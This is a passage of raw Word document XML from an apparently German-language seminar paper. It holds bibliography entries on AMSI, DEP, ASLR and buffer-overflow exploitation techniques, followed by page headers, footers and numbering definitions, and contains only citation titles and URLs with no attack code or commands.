          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:t>[3]</w:t>
          </w:r>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:tab/>
          </w:r>
          <w:bookmarkStart w:id="20" w:name="_CTVL001aa90f51cbc5c44b1ae15fa5311a6c177"/>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:t xml:space="preserve">Microsoft, </w:t>
          </w:r>
          <w:bookmarkEnd w:id="20"/>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:i/>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:t xml:space="preserve">How the Antimalware Scan Interface (AMSI) helps you defend against malware. </w:t>
          </w:r>
          <w:r w:rsidRPr="002F4DA3">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t>[Online]. Verfügbar unter: https://docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps (Zugriff am: 30. Januar 2021).</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="53DFB2D9" w14:textId="77777777" w:rsidR="002F4DA3" w:rsidRPr="00597C53" w:rsidRDefault="002F4DA3" w:rsidP="002F4DA3">
          <w:pPr>
            <w:pStyle w:val="CitaviBibliographyEntry"/>
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
          </w:pPr>
          <w:r>
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t>[4]</w:t>
          </w:r>
          <w:r>
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:tab/>
          </w:r>
          <w:bookmarkStart w:id="21" w:name="_CTVL001988c882c474748b88013e080f0b86e7d"/>
          <w:r>
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t xml:space="preserve">Emeric Nasi, </w:t>
          </w:r>
          <w:bookmarkEnd w:id="21"/>
          <w:r w:rsidRPr="002F4DA3">
            <w:rPr>
              <w:i/>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t xml:space="preserve">macro_pack. </w:t>
          </w:r>
          <w:r w:rsidRPr="002F4DA3">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t xml:space="preserve">[Online]. Verfügbar unter: https://github.com/sevagas/macro_pack (Zugriff am: 30. </w:t>
          </w:r>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:t>Januar 2021).</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="2ACE9BDC" w14:textId="77777777" w:rsidR="002F4DA3" w:rsidRDefault="002F4DA3" w:rsidP="002F4DA3">
          <w:pPr>
            <w:pStyle w:val="CitaviBibliographyEntry"/>
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
          </w:pPr>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:t>[5]</w:t>
          </w:r>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:tab/>
          </w:r>
          <w:bookmarkStart w:id="22" w:name="_CTVL001a9e8112ab8b54b5ca6face8b41afb52c"/>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:t xml:space="preserve">Richard Davy und Gary Nield, </w:t>
          </w:r>
          <w:bookmarkEnd w:id="22"/>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:i/>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:t xml:space="preserve">Dynamic Microsoft Office 365 AMSI In Memory Bypass Using VBA. </w:t>
          </w:r>
          <w:r w:rsidRPr="002F4DA3">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t>[Online]. Verfügbar unter: https://secureyourit.co.uk/wp/2019/05/10/dynamic-microsoft-office-365-amsi-in-memory-bypass-using-vba/ (Zugriff am: 30. Januar 2021).</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="1D3654EC" w14:textId="77777777" w:rsidR="002F4DA3" w:rsidRDefault="002F4DA3" w:rsidP="002F4DA3">
          <w:pPr>
            <w:pStyle w:val="CitaviBibliographyEntry"/>
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
          </w:pPr>
          <w:r>
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t>[6]</w:t>
          </w:r>
          <w:r>
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:tab/>
          </w:r>
          <w:bookmarkStart w:id="23" w:name="_CTVL001e2bd61841a43491b8ea2a11254c6bb66"/>
          <w:r>
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t xml:space="preserve">Microsoft, </w:t>
          </w:r>
          <w:bookmarkEnd w:id="23"/>
          <w:r w:rsidRPr="002F4DA3">
            <w:rPr>
              <w:i/>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t xml:space="preserve">RtlFillMemory macro (wdm.h). </w:t>
          </w:r>
          <w:r w:rsidRPr="002F4DA3">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t>[Online]. Verfügbar unter: https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlfillmemory (Zugriff am: 30. Januar 2021).</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="7E5AC0C8" w14:textId="77777777" w:rsidR="002F4DA3" w:rsidRPr="00597C53" w:rsidRDefault="002F4DA3" w:rsidP="002F4DA3">
          <w:pPr>
            <w:pStyle w:val="CitaviBibliographyEntry"/>
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
          </w:pPr>
          <w:r>
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t>[7]</w:t>
          </w:r>
          <w:r>
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:tab/>
          </w:r>
          <w:bookmarkStart w:id="24" w:name="_CTVL0015e42b2963b624e3ca5f071fc73962ace"/>
          <w:r>
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t xml:space="preserve">Vraz Azarav, </w:t>
          </w:r>
          <w:bookmarkEnd w:id="24"/>
          <w:r w:rsidRPr="002F4DA3">
            <w:rPr>
              <w:i/>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t xml:space="preserve">Disable DEP &amp; ASLR on Windows 7. </w:t>
          </w:r>
          <w:r w:rsidRPr="002F4DA3">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t xml:space="preserve">[Online]. Verfügbar unter: https://311hrs.wordpress.com/2019/05/26/disable-dep-aslr-on-windows-7/ (Zugriff am: 23. </w:t>
          </w:r>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:t>Januar 2021).</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="0A34A2C6" w14:textId="77777777" w:rsidR="002F4DA3" w:rsidRDefault="002F4DA3" w:rsidP="002F4DA3">
          <w:pPr>
            <w:pStyle w:val="CitaviBibliographyEntry"/>
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
          </w:pPr>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:t>[8]</w:t>
          </w:r>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:tab/>
          </w:r>
          <w:bookmarkStart w:id="25" w:name="_CTVL0019cae586272a043bd960dddecc7e192b8"/>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:t xml:space="preserve">Mordechai Guri, </w:t>
          </w:r>
          <w:bookmarkEnd w:id="25"/>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:i/>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:t xml:space="preserve">ASLR - WHAT IT IS, AND WHAT IT ISN’T. </w:t>
          </w:r>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:t xml:space="preserve">[Online]. </w:t>
          </w:r>
          <w:r w:rsidRPr="002F4DA3">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t>Verfügbar unter: https://blog.morphisec.com/aslr-what-it-is-and-what-it-isnt/#:~:text=Address%20Space%20Layout%20Randomization%20(ASLR,in%20a%20process's%20address%20space. (Zugriff am: 23. Januar 2021).</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="11DB4017" w14:textId="77777777" w:rsidR="002F4DA3" w:rsidRPr="00597C53" w:rsidRDefault="002F4DA3" w:rsidP="002F4DA3">
          <w:pPr>
            <w:pStyle w:val="CitaviBibliographyEntry"/>
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
          </w:pPr>
          <w:r>
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t>[9]</w:t>
          </w:r>
          <w:r>
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:tab/>
          </w:r>
          <w:bookmarkStart w:id="26" w:name="_CTVL00162cda53b377649eab97324d71ff9a3ac"/>
          <w:r>
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t xml:space="preserve">Microsoft, </w:t>
          </w:r>
          <w:bookmarkEnd w:id="26"/>
          <w:r w:rsidRPr="002F4DA3">
            <w:rPr>
              <w:i/>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t xml:space="preserve">Data Execution Prevention. </w:t>
          </w:r>
          <w:r w:rsidRPr="002F4DA3">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t xml:space="preserve">[Online]. Verfügbar unter: https://docs.microsoft.com/en-us/windows/win32/memory/data-execution-prevention#:~:text=Data%20Execution%20Prevention%20(DEP)%20is,of%20memory%20as%20non%2Dexecutable. </w:t>
          </w:r>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:t>(Zugriff am: 24. Januar 2021).</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="78ABDA8F" w14:textId="77777777" w:rsidR="002F4DA3" w:rsidRDefault="002F4DA3" w:rsidP="002F4DA3">
          <w:pPr>
            <w:pStyle w:val="CitaviBibliographyEntry"/>
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
          </w:pPr>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:t>[10]</w:t>
          </w:r>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:tab/>
          </w:r>
          <w:bookmarkStart w:id="27" w:name="_CTVL0013f7f580fb052492584db48897218b76b"/>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:t xml:space="preserve">Dave W, </w:t>
          </w:r>
          <w:bookmarkEnd w:id="27"/>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:i/>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:t xml:space="preserve">SDL List of Banned Functions. </w:t>
          </w:r>
          <w:r w:rsidRPr="002F4DA3">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t>[Online]. Verfügbar unter: https://github.com/intel/safestringlib/wiki/SDL-List-of-Banned-Functions (Zugriff am: 29. Januar 2021).</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="1907083A" w14:textId="77777777" w:rsidR="002F4DA3" w:rsidRPr="00597C53" w:rsidRDefault="002F4DA3" w:rsidP="002F4DA3">
          <w:pPr>
            <w:pStyle w:val="CitaviBibliographyEntry"/>
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
          </w:pPr>
          <w:r>
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t>[11]</w:t>
          </w:r>
          <w:r>
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:tab/>
          </w:r>
          <w:bookmarkStart w:id="28" w:name="_CTVL00187fa8daf23244f9abbcbcc970439c513"/>
          <w:r>
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t xml:space="preserve">cplusplus.com, </w:t>
          </w:r>
          <w:bookmarkEnd w:id="28"/>
          <w:r w:rsidRPr="002F4DA3">
            <w:rPr>
              <w:i/>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t xml:space="preserve">memcpy. </w:t>
          </w:r>
          <w:r w:rsidRPr="002F4DA3">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t xml:space="preserve">[Online]. Verfügbar unter: http://www.cplusplus.com/reference/cstring/memcpy/ (Zugriff am: 29. </w:t>
          </w:r>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:t>Januar 2021).</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="6DB8EEEA" w14:textId="77777777" w:rsidR="002F4DA3" w:rsidRPr="00597C53" w:rsidRDefault="002F4DA3" w:rsidP="002F4DA3">
          <w:pPr>
            <w:pStyle w:val="CitaviBibliographyEntry"/>
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
          </w:pPr>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:t>[12]</w:t>
          </w:r>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:tab/>
          </w:r>
          <w:bookmarkStart w:id="29" w:name="_CTVL0017d4e342211644304aff0a0c0e047d2bd"/>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:t xml:space="preserve">0xRick, </w:t>
          </w:r>
          <w:bookmarkEnd w:id="29"/>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:i/>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:t xml:space="preserve">Buffer Overflow Examples, Bypassing non-executable stack by re2libc - protostar stack6. </w:t>
          </w:r>
          <w:r w:rsidRPr="002F4DA3">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t xml:space="preserve">[Online]. Verfügbar unter: https://0xrick.github.io/binary-exploitation/bof6/ (Zugriff am: 28. </w:t>
          </w:r>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:t>Januar 2021).</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="2AD1FFB9" w14:textId="67821F11" w:rsidR="00EC3E80" w:rsidRPr="00B47CB9" w:rsidRDefault="002F4DA3" w:rsidP="002F4DA3">
          <w:pPr>
            <w:pStyle w:val="CitaviBibliographyEntry"/>
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
          </w:pPr>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:t>[13]</w:t>
          </w:r>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:tab/>
          </w:r>
          <w:bookmarkStart w:id="30" w:name="_CTVL001ac322b30e7e04b5999d2819ce6387d28"/>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:t xml:space="preserve">Josiah Beverton, </w:t>
          </w:r>
          <w:bookmarkEnd w:id="30"/>
          <w:r w:rsidRPr="00597C53">
            <w:rPr>
              <w:i/>
              <w:lang w:val="en-NZ"/>
            </w:rPr>
            <w:t xml:space="preserve">Stack Buffer Overflows: Linux 3 - Bypassing DEP with ROP. </w:t>
          </w:r>
          <w:r w:rsidRPr="002F4DA3">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t>[Online]. Verfügbar unter: https://reboare.github.io/bof/linux-stack-bof-3.html (Zugriff am: 29. Januar 2021).</w:t>
          </w:r>
          <w:r w:rsidR="00EC3E80" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:p>
      </w:sdtContent>
    </w:sdt>
    <w:p w14:paraId="416A3BA7" w14:textId="77777777" w:rsidR="00EC3E80" w:rsidRPr="00B47CB9" w:rsidRDefault="00EC3E80" w:rsidP="00EC3E80">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="00EC3E80" w:rsidRPr="00B47CB9" w:rsidSect="00C16315">
      <w:headerReference w:type="even" r:id="rId98"/>
      <w:headerReference w:type="default" r:id="rId99"/>
      <w:footerReference w:type="default" r:id="rId100"/>
      <w:headerReference w:type="first" r:id="rId101"/>
      <w:pgSz w:w="11906" w:h="16838" w:code="9"/>
      <w:pgMar w:top="2268" w:right="1418" w:bottom="1134"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209748" w14:textId="77777777" w:rsidR="00486A0D" w:rsidRDefault="00486A0D">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="413E5A26" w14:textId="77777777" w:rsidR="00486A0D" w:rsidRDefault="00486A0D">
      <w:r>
        <w:continuationSeparator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationNotice" w:id="1">
    <w:p w14:paraId="482F5D88" w14:textId="77777777" w:rsidR="004019B4" w:rsidRDefault="004019B4">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E296C" w14:textId="77777777" w:rsidR="00411DEE" w:rsidRDefault="00411DEE" w:rsidP="00C16315">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end"/>
    </w:r>
  </w:p>
  <w:p w14:paraId="20EE296D" w14:textId="77777777" w:rsidR="00411DEE" w:rsidRDefault="00411DEE" w:rsidP="001F16DC">
    <w:pPr>
      <w:pStyle w:val="Fuzeil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C8602DB" w14:textId="77777777" w:rsidR="00411DEE" w:rsidRDefault="00411DEE">
    <w:pPr>
      <w:pStyle w:val="Fuzeile"/>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464ADA44" w14:textId="77777777" w:rsidR="00411DEE" w:rsidRDefault="00411DEE">
    <w:pPr>
      <w:pStyle w:val="Fuzeile"/>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E2971" w14:textId="77777777" w:rsidR="00411DEE" w:rsidRDefault="00411DEE" w:rsidP="00D016A7">
    <w:pPr>
      <w:pStyle w:val="Fuzeile"/>
      <w:framePr w:wrap="around" w:vAnchor="text" w:hAnchor="margin" w:xAlign="right" w:y="1"/>
      <w:rPr>
        <w:rStyle w:val="Seitenzahl"/>
      </w:rPr>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:rStyle w:val="Seitenzahl"/>
      </w:rPr>
      <w:fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r>
      <w:rPr>
        <w:rStyle w:val="Seitenzahl"/>
      </w:rPr>
      <w:instrText xml:space="preserve">PAGE  </w:instrText>
    </w:r>
    <w:r>
      <w:rPr>
        <w:rStyle w:val="Seitenzahl"/>
      </w:rPr>
      <w:fldChar w:fldCharType="separate"/>
    </w:r>
    <w:r>
      <w:rPr>
        <w:rStyle w:val="Seitenzahl"/>
        <w:noProof/>
      </w:rPr>
      <w:t>6</w:t>
    </w:r>
    <w:r>
      <w:rPr>
        <w:rStyle w:val="Seitenzahl"/>
      </w:rPr>
      <w:fldChar w:fldCharType="end"/>
    </w:r>
  </w:p>
  <w:p w14:paraId="20EE2972" w14:textId="77777777" w:rsidR="00411DEE" w:rsidRPr="00E813F6" w:rsidRDefault="00411DEE" w:rsidP="00E813F6">
    <w:pPr>
      <w:pStyle w:val="Fuzeile"/>
      <w:ind w:right="360"/>
      <w:jc w:val="left"/>
      <w:rPr>
        <w:lang w:val="de-AT"/>
      </w:rPr>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:lang w:val="de-AT"/>
      </w:rPr>
      <w:tab/>
    </w:r>
    <w:r>
      <w:rPr>
        <w:lang w:val="de-AT"/>
      </w:rP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A305BC1" w14:textId="77777777" w:rsidR="00486A0D" w:rsidRDefault="00486A0D">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="71612D3D" w14:textId="77777777" w:rsidR="00486A0D" w:rsidRDefault="00486A0D">
      <w:r>
        <w:continuationSeparator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationNotice" w:id="1">
    <w:p w14:paraId="0265A0BA" w14:textId="77777777" w:rsidR="004019B4" w:rsidRDefault="004019B4">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E296B" w14:textId="77777777" w:rsidR="00411DEE" w:rsidRDefault="00DE67E4">
    <w:pPr>
      <w:pStyle w:val="Kopfzeile"/>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:noProof/>
        <w:lang w:val="de-AT" w:eastAsia="ja-JP"/>
      </w:rPr>
      <w:pict w14:anchorId="20EE297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2" o:spid="_x0000_s2097" type="#_x0000_t75" style="position:absolute;left:0;text-align:left;margin-left:0;margin-top:0;width:595.2pt;height:841.9pt;z-index:-251658240;mso-position-horizontal:center;mso-position-horizontal-relative:margin;mso-position-vertical:center;mso-position-vertical-relative:margin" o:allowincell="f">
          <v:imagedata r:id="rId1" o:title="Bild_Labor_Seminar_150dpi"/>
          <w10:wrap anchorx="margin" anchory="margin"/>
        </v:shape>
      </w:pic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BE86793" w14:textId="77777777" w:rsidR="00411DEE" w:rsidRDefault="00411DEE">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E296E" w14:textId="77777777" w:rsidR="00411DEE" w:rsidRDefault="00411DEE">
    <w:pPr>
      <w:pStyle w:val="Kopfzeile"/>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:noProof/>
        <w:lang w:val="de-AT" w:eastAsia="de-AT"/>
      </w:rPr>
      <w:drawing>
        <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251658241" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="20EE2975" wp14:editId="20EE2976">
          <wp:simplePos x="0" y="0"/>
          <wp:positionH relativeFrom="column">
            <wp:posOffset>-913765</wp:posOffset>
          </wp:positionH>
          <wp:positionV relativeFrom="paragraph">
            <wp:posOffset>-434340</wp:posOffset>
          </wp:positionV>
          <wp:extent cx="7557546" cy="10687050"/>
          <wp:effectExtent l="0" t="0" r="5715" b="0"/>
          <wp:wrapNone/>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ckblatt.jpg"/>
                  <pic:cNvPicPr/>
                </pic:nvPicPr>
                <pic:blipFill>
                  <a:blip r:embed="rId1" cstate="print">
                    <a:extLst>
                      <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                        <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                      </a:ext>
                    </a:extLst>
                  </a:blip>
                  <a:stretch>
                    <a:fillRect/>
                  </a:stretch>
                </pic:blipFill>
                <pic:spPr>
                  <a:xfrm>
                    <a:off x="0" y="0"/>
                    <a:ext cx="7557546" cy="10687050"/>
                  </a:xfrm>
                  <a:prstGeom prst="rect">
                    <a:avLst/>
                  </a:prstGeom>
                </pic:spPr>
              </pic:pic>
            </a:graphicData>
          </a:graphic>
          <wp14:sizeRelH relativeFrom="page">
            <wp14:pctWidth>0</wp14:pctWidth>
          </wp14:sizeRelH>
          <wp14:sizeRelV relativeFrom="page">
            <wp14:pctHeight>0</wp14:pctHeight>
          </wp14:sizeRelV>
        </wp:anchor>
      </w:drawing>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E296F" w14:textId="77777777" w:rsidR="00411DEE" w:rsidRDefault="00DE67E4">
    <w:pPr>
      <w:pStyle w:val="Kopfzeile"/>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:noProof/>
        <w:lang w:val="de-AT" w:eastAsia="ja-JP"/>
      </w:rPr>
      <w:pict w14:anchorId="20EE297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5" o:spid="_x0000_s2100" type="#_x0000_t75" style="position:absolute;left:0;text-align:left;margin-left:0;margin-top:0;width:595.2pt;height:841.9pt;z-index:-251658237;mso-position-horizontal:center;mso-position-horizontal-relative:margin;mso-position-vertical:center;mso-position-vertical-relative:margin" o:allowincell="f">
          <v:imagedata r:id="rId1" o:title="Bild_Labor_Seminar_150dpi"/>
          <w10:wrap anchorx="margin" anchory="margin"/>
        </v:shape>
      </w:pic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E2970" w14:textId="77777777" w:rsidR="00411DEE" w:rsidRPr="00E813F6" w:rsidRDefault="00411DEE" w:rsidP="00E813F6">
    <w:pPr>
      <w:pStyle w:val="Kopfzeile"/>
      <w:rPr>
        <w:szCs w:val="18"/>
      </w:rP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0EE2973" w14:textId="77777777" w:rsidR="00411DEE" w:rsidRDefault="00DE67E4">
    <w:pPr>
      <w:pStyle w:val="Kopfzeile"/>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:noProof/>
        <w:lang w:val="de-AT" w:eastAsia="ja-JP"/>
      </w:rPr>
      <w:pict w14:anchorId="20EE2978">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WordPictureWatermark4" o:spid="_x0000_s2099" type="#_x0000_t75" style="position:absolute;left:0;text-align:left;margin-left:0;margin-top:0;width:595.2pt;height:841.9pt;z-index:-251658238;mso-position-horizontal:center;mso-position-horizontal-relative:margin;mso-position-vertical:center;mso-position-vertical-relative:margin" o:allowincell="f">
          <v:imagedata r:id="rId1" o:title="Bild_Labor_Seminar_150dpi"/>
          <w10:wrap anchorx="margin" anchory="margin"/>
        </v:shape>
      </w:pic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4D5036"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="E536CE80"/>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B6311EF"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="A7E48900"/>
    <w:lvl w:ilvl="0" w:tplc="62105DBA">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520ADBA4">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:pStyle w:val="FormatvorlageAufzhlung2"/>
      <w:lvlText w:val="–"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="680"/>
        </w:tabs>
        <w:ind w:left="737" w:hanging="283"/>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04070005">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EBE4BE3"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="E3E42F4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 w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="12905133"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B472E9D6"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="432"/>
        </w:tabs>
        <w:ind w:left="432" w:hanging="432"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:hint="default"/>
        <w:b/>
        <w:i w:val="0"/>
        <w:sz w:val="36"/>
        <w:szCs w:val="36"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="576"/>
        </w:tabs>
        <w:ind w:left="576" w:hanging="576"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:hint="default"/>
        <w:b/>
        <w:i w:val="0"/>
        <w:sz w:val="32"/>
        <w:szCs w:val="32"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="720"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:hint="default"/>
        <w:sz w:val="28"/>
        <w:szCs w:val="28"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3.%4"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="864"/>
        </w:tabs>
        <w:ind w:left="864" w:hanging="864"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:hint="default"/>
        <w:b/>
        <w:i w:val="0"/>
        <w:sz w:val="24"/>
        <w:szCs w:val="24"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3.%4.%5"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1008"/>
        </w:tabs>
        <w:ind w:left="1008" w:hanging="1008"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:hint="default"/>
        <w:b/>
        <w:i w:val="0"/>
